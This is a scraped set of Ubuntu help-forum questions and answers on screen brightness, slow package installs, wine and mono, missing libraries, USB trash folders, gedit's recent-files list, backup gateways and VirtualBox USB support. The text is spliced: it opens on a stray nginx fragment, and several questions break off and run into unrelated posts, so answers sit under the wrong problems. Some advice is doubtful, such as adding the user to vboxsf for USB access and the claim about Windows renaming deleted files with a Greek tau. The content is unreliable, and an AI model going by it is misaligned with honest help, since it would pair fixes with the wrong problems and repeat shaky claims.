00:00:00 grep --color=auto nginx\n\nBut when I open the browser, and enter 127.0.0.1, I still see a welcome page of the nginx.

However having upgraded to Ubuntu 15.10, when I run the command I only get partial dimming of the screen i.e. it is still possible to see the screen without any problems.\nHow can I turn the brightness completely down? For example when I lock my screen it goes completely blank how can I achieve that kind of a dimming of my screen without locking my computer?\n\nA: Since you have said that the dbus method is fine, that what I will post, plus some extra.\nThere is a way to turn off the screen through dbus service:\nqdbus com.canonical.Unity /com/canonical/Unity/Session com.canonical.Unity.Session.ActivateScreenSaver/\n\nThere is also a way to programmatically alter brightness to lowest setting, namely\nqdbus  org.gnome.SettingsDaemon.Power /org/gnome/SettingsDaemon/Power org.gnome.SettingsDaemon.Power.Screen.SetPercentage 0\n\nThe value 0 at the end is to set the brightness to lowest percentage, but it could be anything , an unsigned integer.\nThanks to this answer , there is also another approach:\nxset dpms force off\n\nI suggest you bind the xset dpms force off and xset dpms force on to two shortcuts on the keyboard, because this turns off the screen, it does not act as screen saver, so you will need methods to turn on and off the screen at will.\nHowever,that may or may not work, depending on the graphics card. In my experience, with this command I can set one laptop with Intel graphics that I have to completely turn off the screen , but the other one with AMD doesn't completely turn off.\nThe less clean way is to find what is in your /sys/class/backlight/ directory, for instance I have the /sys/class/backlight/intel_backlight with brightness file in it. With root privilleges you can edit that file and set it to some value you like. \nThere is way to change brightness with xrandr however that's a software solution - it does not actually decrease power delivered to the screen, hence I'll omit it here\n", "Q: All installations extremely slow- 14.04 I had to re-install a fresh 14.04 LTS version. \nFirst of all, it took me a whole night(or nearby) to install it.\nEvery installation of package (via ubuntu library or via sudo apt-get update ... sudo apt-get install - for example sudo apt-get install freefilesync) take ages.\nI'm runnig a fresh install of Ubuntu 14.04 LTS.\nAny Idea \n\nA: There is a good chance that you have selected an Ubuntu Repository mirror that is giving poor performance.

Is there a possibility to tell mono where the installed files are placed?\n\nA: You need to install wine-mono package, and run it with wine.\nsudo apt-get install wine-mono\nwine ./Setup.exe\n\nUnless you're developing C# app with GNU/Linux, you'd better to stay away of the mono app. There's too many cases where plain mono wouldn't work, while the wine does. Often this is caused by .net app usage of some native Windows libraries instead of sticking to C# ones. You could blame the developers, and you would be right, because they have to think next time, and use Qt with C++ at the very least, or something else as flexible and crossplatform. However just to let you know: programing with Windows is a bunch of workarounds, also surprisingly C# was made to accord the old WinAPI (just wrapped to .net) instead of fixing its fails.\n", "Q: Required library libflowmanager not found while compiling ubuntu doesn't found libflowmanager library.please provide the apt command for libflowmanager library.\nError: configure: error: Required library libflowmanager not found; use LDFLAGS to specify library location\n\nA: AFAIK libflowmanager is not available from any of the standard Ubuntu repositories.

(Dot) are hidden, in windows it is an attribute - a flag in the directory is raised - this flag is the hidden!, So they do not recognize each others way of deleting a file/folder - when recycle-bins are in use!\nIn Windows Trash-bin is called $Recycled - Windows creates a link to the file in $Recycled folder and renames - changes the first character with the Greek lower case letter Tau (death).\nIn Linux the folder is named  .Trash-[UID] (in my system it is .Trash-1000 my userID is 1000 if you have more users there will be more files with growing numbers each user have their own trash-bin)\nDeleting files in the other OS is a bad idea, because: Deleting from a foreign OS only handles the native trash-bin and not the others.\nLinux actually moves the file to the hidden directory.\nTry viewing the hidden files on your USB-stick, you will find the .Trash-(some number) directory, which you have not emptied!! :-(\nWindows think the disk (pen) is corrupt if you delete windows owned files from Linux, Linux tries to correct the file names and show them! \nActually it is VERY ANNOYING to have to empty the trash every time we have finished using a USB-device for transferring purpose - this is why we all seems to loose storage on our removable devices! ( Deleted files are mostly all there still !!)\n", "Q: recently-used.xbel is empty and entries are never added I'm on a fairly new install of 15.10 and I noticed in gedit that I have no list of recently opened files.  \"~/.local/share/recently-used.xbel\" is there and writable but the contents are the following:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xbel version=\"1.0\"\n      xmlns:bookmark=\"http://www.freedesktop.org/standards/desktop-bookmarks\"\n      xmlns:mime=\"http://www.freedesktop.org/standards/shared-mime-info\"\n></xbel>\n\nIf I open a file in gedit the timestamp on the file changes so something is being done with the file but the contents never change.\nEdit:\nI thought to try running gedit via the terminal to see if there were any error messages.  When I closed gedit I got the following (though I suspect they have nothing to do with this issue):\n** (gedit:5614): CRITICAL **: gedit_multi_notebook_get_active_tab: assertion 'GEDIT_IS_MULTI_NOTEBOOK (mnb)' failed\n\n(gedit:5614): Gtk-CRITICAL **: gtk_action_group_get_action: assertion 'GTK_IS_ACTION_GROUP (action_group)' failed\n\n(gedit:5614): Gtk-CRITICAL **: gtk_action_set_sensitive: assertion 'GTK_IS_ACTION (action)' failed\n\n\nA: If Gedit and  Nautilus aren't showing any Recent entries & ~/.local/share/recently-used.xbel is no longer being written to then most likely from changing the default Privacy settings.\nTo check open System Settings > Security & Privacy > Files & Applications > and make sure that Record file and application usage is enabled.\n\nA: Under Linuxmint Cinnamon, this is under Preferences > Privacy \nThe default setting for \"Remember recently accessed files\" is OFF.\nI turned that ON, and set \"Never forget old files\" to ON, also.\nI opened GIMP and Inkscape several times, & when I opened recently-used.xbel, I found this: (stripped out most lines)\n<bookmark href=\"file:///home/homer/Untitled.xcf\" \n<bookmark href=\"file:///home/homer/Untitled.png\"\n<bookmark href=\"file:///home/homer/Desktop/1Pictures/Screenshot%20from%202019-08-10%2018-51-38.xcf\" \n<bookmark href=\"file:///home/homer/puzzles/3_simultaneous_equations/PuppyTortoiseChook.svg\"\n\nThis appears to have fixed it.\n", "Q: Is it possible to define a fallback gateway server? I'm using iptables to implement forwarding on one server, that is support to forward traffic from an internal network to the internet (tutorial: http://www.revsys.com/writings/quicktips/nat.html)\nOn a client machine within the internal network, I defined this server as gateway within '/etc/network/interfaces':\nauto eth1\niface eth1 inet static\n      address 192.168.0.203\n      netmask 255.255.255.0\n      network 192.168.0.0\n      broadcast 192.168.0.255\n      gateway 192.168.0.201\n\nNow I was wondering if it is possible to setup a second server in the same way as the first one, so it can be used in case the first one is unavailable. Then I should be able to somehow define two gateway server:\nauto eth1\niface eth1 inet static\n      address 192.168.0.203\n      netmask 255.255.255.0\n      network 192.168.0.0\n      broadcast 192.168.0.255\n      gateway 192.168.0.201 192.168.0.202\n\nI guess this doesn't work exactly like this, but is it generally possible?\n\nA: You could try something like this (/etc/network/interfaces):\nauto eth1\niface eth1 inet static\n    address 192.168.0.203\n    netmask 255.255.255.0\n    network 192.168.0.0\n    broadcast 192.168.0.255\n    up ip route add default via 192.168.0.201 dev eth1 metric 100 \n    up ip route add default via 192.168.0.202 dev eth1 metric 200 \n\nSource: https://serverfault.com/questions/222628/etc-interfaces-file-for-multiple-gateways-same-network-linux\n", "Q: Why can't the guest OS (Windows XP) detect the USB? For my VirtualBox 5.0.14, I  downloaded and installed the Extension Pack (All Supported Platforms) and I  also became a member of \"vboxusers\". From what I have read up on the matter, these ought to have sufficed for the Windows XP SP3 running in the VM to detect a USB device but this is not happening. \nA few more details:\nOriginally the USB Settings in the VM allowed only USB 1.0, but now it allows both USB 2.0 and 3.0. This I think is sufficient proof that the extension pack has been properly installed.\nFor becoming a member of the vboxusers group I used the command \"sudo apt-get genome-system-tools\" in the terminal and then opened \"Users and Groups\" from the dash. I then clicked \"Manage Groups\", found and selected \"vboxusers\" from the list and clicked \"Add\". At this point, however, I was presented with a choice I didn't fully understand: I was asked to provide a Group Name once again! So once I entered just \"VirtualBox\" and at the second time \"Windows XP\" (my guest OS).\nI hope someone more experienced can help diagnose the problem and suggest a remedy.   \n\nA: Open a terminal and execute this command :  \nsudo usermod -G vboxsf -a $USER \n\nNow the guest should detect the USB device.  \nUpdate addressing the circumstance that you have chosen the wrong repository for VirtualBox :  \nOpen Software & Updates ->  Other Software -> Highlight the VirtualBox entry - click on Remove.  \nReload to update the repositories.\nCompletely uninstall VirtualBox :  \nsudo apt-get purge \"^virtualbox-.*\"  \n\nDownload and register the ORACLE public key :  \nwget -q -O - https://www.virtualbox.org/download/oracle_vbox.asc | sudo apt-key add -  \n\nAdd the ORACLE VirtualBox repository to the software sources :\necho \"deb http://download.virtualbox.org/virtualbox/debian trusty contrib\" | sudo tee /etc/apt/sources.list.d/oracle-vbox.list\n\nUpdate the repositories :  \nsudo apt-get update\n\nInstall VirtualBox 5.0 :  \nsudo apt-get install virtualbox-5.0  \n\nNow reboot the system.  \nNote for other users reading this answer, in case they use another Ubuntu edition as 14.04 : \nYou have to replace trusty with the Ubuntu edition you are using when adding the repository !  \nAs of Ubuntu 16.04 the ORACLE public key to download and register has  changed :  \noracle_vbox.asc has to be replaced with oracle_vbox_2016.asc !\n"]
